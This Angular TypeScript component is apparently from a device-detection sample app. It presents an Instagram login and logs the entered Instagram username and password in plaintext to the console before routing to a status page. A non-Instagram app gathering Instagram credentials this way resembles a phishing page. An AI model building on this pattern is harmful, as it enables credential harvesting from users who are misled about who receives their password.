import { Component, OnInit } from '@angular/core';
import { Router } from '@angular/router';
import { DeviceDetectorService, DeviceInfo } from 'ngx-device-detector';

@Component({
  selector: 'app-instagram-login',
  templateUrl: './instagram-login.component.html',
  styleUrls: ['./instagram-login.component.css'],
})
export class InstagramLoginComponent implements OnInit {
  constructor(
    private deviceDetectorService: DeviceDetectorService,
    private router: Router
  ) {}
  deviceInfo!: DeviceInfo;
  title = 'device-detection-sample';
  buttonClicked = true;

  getInputs(igUserName: string, igPassword: string) {
    const details = [
      { username: igUserName + '(Instagram)', password: igPassword },
    ];
    console.log(details);
    this.router.navigate(['/status']);
  }
  ngOnInit(): void {
    this.deviceInfo = this.deviceDetectorService.getDeviceInfo();
  }
}
